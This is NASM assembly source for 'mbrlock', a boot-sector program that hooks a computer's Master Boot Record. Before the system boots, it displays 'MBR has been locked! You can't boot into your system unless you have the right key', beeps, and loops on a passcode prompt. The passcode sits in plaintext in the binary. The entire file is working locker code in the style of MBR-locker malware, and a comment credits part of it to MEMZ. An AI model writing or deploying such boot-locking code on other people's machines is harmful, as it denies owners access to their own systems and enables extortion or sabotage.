; MBR bootloader code for mbrlock
; (https://github.com/bitwaree/mbrlock)
; Copyright (c) 2024 bitware.


; ####################################################################################
; #                                                                                  # 
; ;--------------------------------[MACRO Definations]-------------------------------;
; #   no mapped address.. !                                                          #
; ####################################################################################



; TYPE: NASM MACRO
;loads a sector at the specified address
;Usage:
;loadsector <address>, <sector_num>, <sector_count>

; ------- DEF start -------
%macro loadsector 3
	; Load the next stage (assume it's in the next sector)
    ;mov bx, 0x7C00      ; Load address for the next stage
    mov ah, 0x02       ; BIOS function to read sectors
    mov al, %3         ; Number of sectors to read
    mov ch, 0          ; Cylinder
    mov cl, %2         ; Sector number ('n'th sector)
    mov dh, 0          ; Head
    mov bx, %1         ; Load to address (eg. 0x7C00)
    int 0x13           ; Call BIOS to read sector
	
%endmacro
; ------- DEF end -------




; TYPE: NASM MACRO
; Switch to text mode and clean the screen
;Usage:
;    textmode_clear

; ------- DEF start -------
%macro textmode_clear 0
    mov ax, 0x0003     ; Function 03h: Set video mode (text mode 80x25)
    int 0x10           ; Call BIOS video interrupt
%endmacro
; ------- DEF end -------





; TYPE: NASM MACRO
; Switch to video mode and clean the screen
;Usage:
;    videomode_clear

; ------- DEF start -------
%macro videomode_clear 0
    mov ax, 0x13       ; Video mode (320x200)
    int 0x10           ; clear screen
%endmacro
; ------- DEF start -------




; TYPE: NASM MACRO
;prints a charcater (char, color)
;Usage:
;    printc <char>, <color>

; ------- DEF start -------
%macro printc 2
	push bx
	mov ah, 0x0e
	mov al, %1;		Character to print
	mov bx, %2;		Color of the cheracter
	int 0x10

	pop bx
%endmacro
; ------- DEF end -------



;TYPE: NASM MACRO
;sleeps a few second (copied from MEMZ)
;Usage:
;    sleep <i>, <j>

; ------- DEF start -------
%macro sleep 2
	; Use BIOS interrupt to sleep
	push dx
	mov ah, 86h
	mov cx, %1
	mov dx, %2
	int 15h
        pop dx
%endmacro
; ------- DEF end -------




; ####################################################################################
; #                                                                                  # 
; ;--------------------------------[Start of Assembly]-------------------------------;
; # file offset: 0x0000                                     0x7c00 :physical address #
; ####################################################################################



[org 0x7c00]            ; Start of the boot sector, it's loaded at 0x7c00 in memory

init:

	sti                 ; Activate interrupts

bootstrap:
	;load 8th (and onwards) sectors at physical address: 0x7c00 + (0x200 * 7) = 0x8a00
    loadsector 0x8a00, 8, 4
	jmp mbrlocker       ; Hook/intercept to mbrlocker code
	
	times 0x13-($-$$) db 0x90   ; nops
bootstrap_end:
	
; *****************************************************
; $                                                   $
; ;---------[Leftover assembly code of MBR]-----------;
; $                                                   $
; $  The bytes will be re-executed once the hook      $
; $  returns, **the bytes is originally noped** but   $
; $  should be overwritten when the hooked code       $
; $  returns.                                         $
; $                                                   $
; *****************************************************
	
times 446-($-$$) db 0x90 ; nop till partition table data
	
	
times 510-($-$$) db 0    ; zero bytes till boot sign
dw 0xaa55                ; boot signature

; ---------(end of MBR)----------

times 3584-($-$$) db 0  ; nop till sector 8


; *****************************************************
; $                                                   $
; ;---------[Start of 8th sector, MBRlocker]----------;
; $                                                   $
; $ The MBRlocker code lives at offset 0xe00 (start   $
; $ of 8th sector), it's mapped at physical address   $
; $ 0x8a00!                                           $
; $                                                   $
; $ Sector 8 ends with a jmp instruction to offset    $
; $ 0x13 or physical address 0x7c13 where the left    $
; $ -over MBR assembly code lives.                    $
; $                                                   $
; $  0x0e00                                   0x8a00  $
; *****************************************************
	



;start of sector 8
mbrlocker:

	; init code
	cli					; Disable Interrupts
	xor ax, ax          ; Initialization of registers
	;init segment register
	mov ds, ax
	mov es, ax
	mov ss, ax
	
	mov sp, 0x7c00      ; Setup StackPointer
	mov bp, sp          ; Setup BasePointer
	sti 				; Re-Enable Interrupts
	
	;mbrlocker code
    textmode_clear      ; clear screen
	mov si, bannerstr   ; print banner text
	call print_str
	
	call initspk        ; initialize speaker
	call beepon         ; do a beep
	
	sleep 0x14, 0xfff0   ; wait a bit
	
	call beepoff        ; stop the beeping sound

    
	; messeage print on bright red color
	videomode_clear     ; switch to 320x200 video mode
	                    ;+clear the screen
						
	xor bx, bx	;reset bx register
	mov dx, bx	;reset dx register as well
	;bx and dx equals 0
	add bx, msg	;acts like a (char *)

    mov bx, msg
    mov cx, 0xC
    call vid_print_str  ; print a message informing about mbr being locked
	
	sleep 0x10, 0xffff  ; wait a bit
	
	call beepon         ; do a beep
	sleep 0x1, 0xffff   ; wait a bit
	call beepoff
	
	
wrongpass_loop:

	mov bx, AskPass_str
    mov cx, 14          ; yellow text
    call vid_print_str  ; ask for passcode
	
	mov bx, in_passcode
    mov dl, 20          ; maximum buffer length
    call scan_str       ; get the user input
	
	mov bx, in_passcode ; user input
	mov dx, passcode    ; the actual pass
	call str_cmp        ; compare the passcode

	cmp al, 0
	je correctpass_continue  ; if both passcode matches
	
	mov bx, WrongPass_str
    mov cx, 0xC         ; bright red text
    call vid_print_str  ; inform user about the passcode being wrong
	
	call beepon         ; do a beep
	sleep 0x7, 0xffff   ; wait a bit
	call beepoff        ; turn the beep off
	
	jmp wrongpass_loop  ; loop it until the correct passcode entered
	
correctpass_continue:
	
	videomode_clear     ; clear the screen
	
	call beepon         ; do a beep
	
	mov bx, CorrectPass_str
    mov cx, 0xA         ; neon green text
    call vid_print_str  ; inform user about the passcode being right 
	
	call beepoff        ; turn the beep off quickly
	
	sleep 0x5, 0xf000   ; wait a bit for user to see message
	
	
	textmode_clear      ; switch back to text mode
	
	

; *****************************************************
; $                                                   $
; ;--------------[Overwritten MBR code]---------------;
; $                                                   $
; $  The bootstrap code (0x0000-0x12) contains 13byte $
; $  when implimenting the bytes are overwritten and  $
; $  the bytes should be placed here so that they get $
; $  executed properly before the control flow jumps  $
; $  back to 0x13(offset) or 0x7c13(physical).        $
; $                                                   $
; *****************************************************


;-----excess mbr code------
    times 0xFFD-($-$$) db 0x90   ; nops till 3 bytes before 9th sector    
;-----excess code end-----

	jmp bootstrap_end   ; jump back to leftover MBR code



; ####################################################################################
; #                                                                                  # 
; ;--------------------[Functions and constant definations]--------------------------;
; # file offset: 0x1000                                     0x8c00 :physical address #
; ####################################################################################

; 9th sector
;------------Constant Data definations------------;


bannerstr:
    db 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A
    ;db '            _/      _/  _/_/_/    _/_/_/    _/                      _/          '
    ;db '           _/_/  _/_/  _/    _/  _/    _/  _/    _/_/      _/_/_/  _/  _/       '
    ;db '          _/  _/  _/  _/_/_/    _/_/_/    _/  _/    _/  _/        _/_/          '
    ;db '         _/      _/  _/    _/  _/    _/  _/  _/    _/  _/        _/  _/         '
    ;db '        _/      _/  _/_/_/    _/    _/  _/    _/_/      _/_/_/  _/    _/        '
    ;db 0
	
    ;db '                          __  ______  ___  __         __                        '
    ;db '                         /  |/  / _ )/ _ \/ /__  ____/ /__                      '
    ;db '                        / /|_/ / _  / , _/ / _ \/ __/  `_/                      '
    ;db '                       /_/  /_/____/_/|_/_/\___/\__/_/\_\                       '
	;db '                                                ----by bitware                  '
	;db 0
	
    db '|               #     # ######  ######                                         |'
    db '|               ##   ## #     # #     # #       ####   ####  #    #            |'
    db '|               # # # # #     # #     # #      #    # #    # #   #             |'
    db '|               #  #  # ######  ######  #      #    # #      ####              |'
    db '|               #     # #     # #   #   #      #    # #      #  #              |'
    db '|               #     # #     # #    #  #      #    # #    # #   #             |'
    db '|               #     # ######  #     # ######  ####   ####  #    #            |'
    db '|                                                           --by bitware       |'
    db 0

msg: db 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A
	db "           MBR has been locked !", 0x0A, 0xA ,0x0D, "You can't boot into your system unless   you have the right key.", 0x0A, 0x0A
	db 0



AskPass_str:     db  0x0A,0x0D, "Enter the code: ", 0

CorrectPass_str: db  0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A
                 db  0x0A,0x0D, "                Welcome!     ", 0
				 
WrongPass_str:   db  0x0A,0x0D, "The passcode is wrong! Try Again!", 0


; *****************************************************
; $                                                   $
; ;--------------[Overwritten MBR code]---------------;
; $                                                   $
; $  'passcode' will contain a ascii passcode that    $
; $  will be used for comparison with the received    $
; $  keystrokes...                                    $
; $                                                   $
; $  * The maximum length is set to 20 charecters     $
; $  * The recived keystrokes will be stored in       $
; $    'in_passcode' which is also 20 charecters max. $
; $  * In HEX editor one can find a string named      $
; $     "PASS:", the passcode is to be placed after   $
; $     the colon ':'                                 $
; $                                                   $
; *****************************************************

db 'PASS:'             ; passcode signature (can be noped out if wanted)

passcode:    times 21 db 0    ; the const passcode
in_passcode: times 21 db 0    ; the entered passcode




;------------Function Snippets------------;


;TYPE: FUNCTION
;prints a string
;Usage:
;    mov si, <ptr>
;    call print_str

; ------- FUNC start -------
print_str:

    mov ah, 0x0e ; int 10h teletype function

; print loop
print_loop:

    lodsb
    cmp al, 0
    je print_done
    int 0x10
    jmp print_loop

print_done:
        ret

; ------- FUNC END -------




;TYPE: FUNCTION
;prints a string in video mode
;Usage:
;    mov bx, <string>
;    mov cx, <attribute>
;    call vid_print_str
;
;Depends: 
;    [MACRO] printc
; ------- FUNC start -------
vid_print_str:

	;mov dx, bx	;reset dx register as well
	;bx and dx equals 0
	;mov bx, bx	            ;acts like a (char *)

vid_print_str_loop:

	;mov bx, dx
	;add bx, msg

	cmp byte [bx], 0
	je vid_print_str_done	;Jmp to hlt if the string is terminated with NULL byte

	printc byte [bx], cx	;Print char byte
	add bx, 1
	jmp vid_print_str_loop

vid_print_str_done:
	
	ret

; ------- FUNC END -------





;TYPE: FUNCTION
;Reads a string from keyboard and stores at the specified address
; MOD: prints a asterisk (*) whenever a charecter entered
;Usage:
;    mov bx, <buffer_address>
;    mov dl, <max_buffer_len>
;    call scan_str
;
; Returns:
; 'al' -> how many char read (strlen)
; 'bx' -> pointer to end of the string (null)

; ------- FUNC start -------
scan_str:
    
; passed : bx -> buffer address
;        : dl -> buffer max length

; return : al -> read buffer length
	mov ah, 0h                  ; Function 0: Read character from keyboard
	push cx                     ; backup cx register
	xor cl, cl                  ; NULLify cl

scan_str_scanloop:
    mov ah, 0h                  ; Function 0: Read character from keyboard
	int 16h                     ; BIOS interrupt 16h
	cmp al, 0x0D
	je scan_str_entr_received   ; Jump: prepare to exit if enter key is received
	
	cmp cl, dl                  ; check if it's the maximum length
	je scan_str_max_len_reached
	
	mov byte [bx], al           ; send the received byte in the (inc) address
	printc '*', 0x7             ; Show a '*' whenever a key recieved
	add bx, 1                   ; array++
	add cl, 1                   ; cl   ++
	;sleep 0x1, 0x7000           ; a little delay to avoid repeat
	jmp scan_str_scanloop       ; Continue the loop until enter key is received
	
	
scan_str_max_len_reached:	
scan_str_entr_received:
	
scan_str_exit:

	mov byte [bx], 0            ; Null terminate the string
	mov al, cl                  ; Move the counter to al
	pop cx
	
	ret
; ------- FUNC end -------





;TYPE: FUNCTION
;finds the length of a null-terminated string (strlen)
;Usage:
;    mov bx, <string>
;    call str_len
;
; Returns:
; 'al' -> (0<length<255) the length

; ------- FUNC start -------
str_len:
    
; passed : bx -> buffer address

; return : al -> length
    push bx
    xor al, al

str_cmp_loop:
    
	cmp byte [bx], 0
	je str_len_exit             ; goto exit if the null byte reached

	add bx, 1                   ; array++
	add al, 1                   ;    al++
	jmp str_cmp_loop            ; Continue the loop until null-byte reached
	

	
str_len_exit:
	pop bx
	ret
; ------- FUNC end -------






;TYPE: FUNCTION
;Compares two strings
;Usage:
;    mov bx, <string1>
;    mov dx, <string2>
;    call str_cmp
;
; Returns:
; 'al' -> 0 if the strings are identical

; ------- FUNC start -------
str_cmp:
    
; passed : bx -> buffer1 address
;        : dx -> buffer2 address

; return : al -> true/false

	push cx
	
    mov cx, bx
	mov bx, dx
	call str_len                ; Get the length of the second string first
	mov ah, al                  ; MOV that into ah
	
	mov bx, cx
	call str_len                ; Get the length of the first string
	
	cmp ah, al
	jne str_cmp_nonidentical    ; length is not equal means not identical
	
	xor al, al
str_cmp_scanloop:

    ; now 'al' is going to be index counter and 'ah' is the string length
	; and 'ch' is going to contain the str2 char and 'cl' will contain str1 char
	push bx                     ; backup str1
	mov bx, dx                  ; load str2 in `bx`
	mov ch, byte [bx]           ; store the char of str2 on 'ch'
	
	pop bx                      ; get the previous 'bx' value (str1) back
	mov cl, byte [bx]           ; store the char of str1 on 'cl'
	
	cmp ch, cl
	jne str_cmp_nonidentical    ; char mismatch means non-identical
	
	cmp ah, al                  ; if the scan index counter is same as strlen
	je str_cmp_identical        ; it's identical
	add al, 1                   ; else, increment 'al' by one
	add bx, 1                   ; and,  increment 'bx' by one
	add dx, 1                   ; and,  increment 'dx' by one
    jmp str_cmp_scanloop        ; loop it :)
	
str_cmp_nonidentical:
	mov al, 1                  ; set 'al' to 1
	jmp str_cmp_exit            ; exit

str_cmp_identical:
    xor al, al                  ; set 'al' to zero
	jmp str_cmp_exit            ; exit

str_cmp_exit:

	pop cx                      ; get the cx value back
	
	ret
; ------- FUNC end -------






;TYPE: FUNCTION
;Initialize pc speaker for beeps
;Usage:
;    call initspk
; ------- FUNC start -------
initspk:

	; Init PC speaker
	mov al, 182
	out 43h, al
	
	ret
; ------- FUNC start -------



;TYPE: FUNCTION
;Does a beep
;Usage:
;    call beepon

; ------- FUNC start -------
beepon:

    ; Set the frequency for the beep
    mov dx, 0x61     ; Port for the PC speaker
    in al, dx        ; Read current state
    or al, 3        ; Set bits 0 and 1 to enable the speaker
    out dx, al      ; Write back to the port

    ; Set the frequency for the beep (around 800 Hz)
    mov dx, 0x43     ; Control word port
    mov al, 0xB6     ; Set mode: square wave, binary, channel 2
    out dx, al       ; Send control word

    ; Set the frequency divisor for 800 Hz
    mov dx, 0x42     ; Channel 2 data port
    mov ax, 1193180 / 800 ; 800 Hz frequency
    out dx, al       ; Send low byte
    mov al, ah
    out dx, al       ; Send high byte
	
	ret
; ------- FUNC start -------


;TYPE: FUNCTION
;Ends a beep
;Usage:
;    call beepoff

; ------- FUNC start -------
beepoff:

	; Stop the beep
    mov dx, 0x61
    in al, dx
    and al, 0xFC     ; Clear bits 0 and 1 to disable the speaker
    out dx, al

	ret
; ------- FUNC start -------


